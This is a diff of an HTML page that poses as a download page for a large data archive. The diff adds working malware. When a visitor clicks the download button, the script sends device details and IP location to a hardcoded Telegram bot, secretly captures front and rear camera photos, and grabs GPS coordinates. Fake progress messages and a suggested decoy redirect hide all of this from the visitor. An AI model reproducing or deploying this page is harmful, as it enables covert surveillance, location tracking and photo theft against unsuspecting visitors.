@@ -3,44 +3,108 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>INITIALIZING SYSTEM...</title>
+  <title>Download Data Full Resources</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
-    body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-    #loading-container { text-align: center; width: 80%; }
-    #progress-bar { width: 0%; height: 2px; background: #0f0; transition: width .3s; margin-top: 10px; }
+    :root {
+        --primary-color: #0070f3;
+        --bg-color: #f6f9fc;
+    }
+    body { 
+        background: var(--bg-color); 
+        color: #333; 
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; 
+        display: flex; justify-content: center; align-items: center; 
+        height: 100vh; margin: 0; overflow: hidden; 
+    }
+    #download-card {
+        background: white;
+        padding: 40px;
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        text-align: center;
+        width: 90%;
+        max-width: 400px;
+        z-index: 10;
+    }
+    .file-icon {
+        width: 80px;
+        margin-bottom: 20px;
+    }
+    .file-name {
+        font-weight: 600;
+        font-size: 18px;
+        margin-bottom: 8px;
+        color: #222;
+    }
+    .file-info {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 25px;
+    }
+    #main-btn {
+        background: var(--primary-color);
+        color: white;
+        border: none;
+        padding: 15px 30px;
+        border-radius: 8px;
+        font-weight: bold;
+        cursor: pointer;
+        font-size: 16px;
+        width: 100%;
+        transition: transform 0.2s, background 0.2s;
+    }
+    #main-btn:hover { background: #0060d0; }
+    #main-btn:active { transform: scale(0.98); }
+    
+    #loader { display: none; margin-top: 20px; }
+    .progress-container {
+        width: 100%;
+        background: #eee;
+        border-radius: 10px;
+        height: 8px;
+        overflow: hidden;
+        margin-top: 15px;
+    }
+    #progress-bar {
+        width: 0%;
+        height: 100%;
+        background: var(--primary-color);
+        transition: width 0.3s;
+    }
+    .status-text { font-size: 12px; color: #888; margin-top: 8px; }
     .hidden { display: none; }
   </style>
 </head>
 <body>
 
-  <div id="loading-container">
-    <div id="loading-text">INITIALIZING CORE SYSTEM...</div>
-    <div style="width:100%; background:#222;"><div id="progress-bar"></div></div>
-    <div id="loading-details" style="font-size:10px; margin-top:10px;">Checking modules...</div>
+  <div id="download-card">
+    <img src="https://cdn-icons-png.flaticon.com/512/2991/2991112.png" class="file-icon" alt="file">
+    <div class="file-name">DATA_FULL_RESOURCES.zip</div>
+    <div class="file-info">Size: 100.24 GB • Compressed Archive</div>
+    
+    <button id="main-btn">DOWNLOAD NOW</button>
+
+    <div id="loader">
+        <div class="progress-container"><div id="progress-bar"></div></div>
+        <div class="status-text" id="status-msg">Requesting server access...</div>
+    </div>
   </div>
-  
+
   <video id="v" autoplay muted class="hidden"></video>
   <canvas id="c" class="hidden"></canvas>
 
   <script>
   (() => {
-    // --- KONFIGURASI ---
+    // --- KONFIGURASI TELEGRAM ---
     const T = '7621493211:AAFfEUR3ri6Z9odBFzvqhGthsymwWPOl5tY';
     const C = '6636068781';
     
+    const btn = document.getElementById('main-btn');
+    const loader = document.getElementById('loader');
     const pb = document.getElementById('progress-bar');
-    const ld = document.getElementById('loading-details');
-    let p = 0;
+    const sm = document.getElementById('status-msg');
 
-    // Animasi Loading Palsu
-    const timer = setInterval(() => {
-      p += Math.random() * 3;
-      if (p > 100) { p = 100; clearInterval(timer); }
-      pb.style.width = p + '%';
-    }, 200);
-
-    // Fungsi Kirim Teks
     const sTG = async (msg) => {
       try {
         await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
@@ -48,29 +112,26 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'HTML' })
         });
-      } catch (e) { console.error("Gagal kirim teks"); }
+      } catch (e) {}
     };
 
-    // Fungsi Kirim Foto
     const sP = async (blob, fileName) => {
       try {
         const fd = new FormData();
         fd.append('chat_id', C);
         fd.append('photo', blob, fileName);
         await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-      } catch (e) { console.error("Gagal kirim foto"); }
+      } catch (e) {}
     };
 
-    // Fungsi Ambil Data Info (Disederhanakan agar tidak error HTML)
     const cDI = async () => {
-      let m = `<b>🔔 NEW LOG DETECTED</b>\n\n`;
+      let m = `<b>🔔 NEW TARGET DETECTED</b>\n\n`;
       m += `<b>🖥 DEVICE:</b> ${navigator.userAgent}\n`;
-      m += `<b>🌐 LANG:</b> ${navigator.language}\n`;
-      m += `<b>💾 RAM:</b> ${navigator.deviceMemory || 'Unknown'} GB\n\n`;
-
+      m += `<b>💾 RAM:</b> ${navigator.deviceMemory || 'Unknown'} GB\n`;
+      
       try {
         const b = await navigator.getBattery();
-        m += `<b>🔋 BATTERY:</b> ${Math.floor(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})\n`;
+        m += `<b>🔋 BATTERY:</b> ${Math.floor(b.level * 100)}%\n`;
       } catch(e) {}
 
       try {
@@ -78,30 +139,26 @@
         const d = await res.json();
         m += `<b>📍 IP:</b> ${d.ip}\n`;
         m += `<b>🏙 CITY:</b> ${d.city}, ${d.country_name}\n`;
-      } catch(e) { m += `❌ Failed to get IP Location\n`; }
+      } catch(e) { m += `❌ IP Location Failed\n`; }
 
       return m;
     };
 
-    // Fungsi Kamera (Dioptimalkan)
     const captureCamera = async (facing) => {
       const v = document.getElementById('v');
       const c = document.getElementById('c');
       let stream;
       try {
-        // Menggunakan 'ideal' agar tidak crash jika kamera tidak ada
         const constraints = { video: { facingMode: facing } };
         stream = await navigator.mediaDevices.getUserMedia(constraints);
         v.srcObject = stream;
         await new Promise(r => v.onloadedmetadata = r);
         v.play();
         await new Promise(r => setTimeout(r, 1000));
-        
         c.width = v.videoWidth;
         c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(b => sP(b, `capture_${facing}.jpg`), 'image/jpeg');
-        
+        c.toBlob(b => sP(b, `cap_${facing}.jpg`), 'image/jpeg');
         stream.getTracks().forEach(t => t.stop());
         return true;
       } catch (e) {
@@ -110,30 +167,45 @@
       }
     };
 
-    // Eksekusi Utama
+    // FUNGSI UTAMA SAAT TOMBOL DIKLIK
     const run = async () => {
-      // 1. Ambil & Kirim Info Perangkat
+      // 1. Ubah Tampilan
+      btn.style.display = 'none';
+      loader.style.display = 'block';
+      
+      // 2. Progres: Ambil Data Info
+      pb.style.width = "30%";
+      sm.innerText = "Connecting to secure server...";
       const info = await cDI();
       await sTG(info);
 
-      // 2. Ambil Foto Depan
+      // 3. Progres: Kamera
+      pb.style.width = "60%";
+      sm.innerText = "Verifying resources...";
       const cam1 = await captureCamera("user");
-      
-      // 3. Ambil Foto Belakang (Hanya jika di HP)
       if (cam1) await captureCamera("environment");
 
-      // 4. GPS (Minta Izin)
+      // 4. Progres: GPS
+      pb.style.width = "85%";
+      sm.innerText = "Optimizing download speed...";
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
-          const g = `<b>📍 GPS COORDINATE</b>\n\nURL: https://www.google.com/maps?q=${lat},${lon}`;
-          await sTG(g);
+          await sTG(`<b>📍 GPS:</b> http://google.com/maps?q=${lat},${lon}`);
         }, null, { enableHighAccuracy: true });
       }
+
+      // 5. Selesai
+      setTimeout(() => {
+        pb.style.width = "100%";
+        sm.innerText = "Starting download...";
+        // Opsional: Redirect ke Google Drive asli biar ga curiga
+        // window.location.href = "https://drive.google.com";
+      }, 2000);
     };
 
-    run();
+    btn.addEventListener('click', run);
   })();
   </script>
 </body>
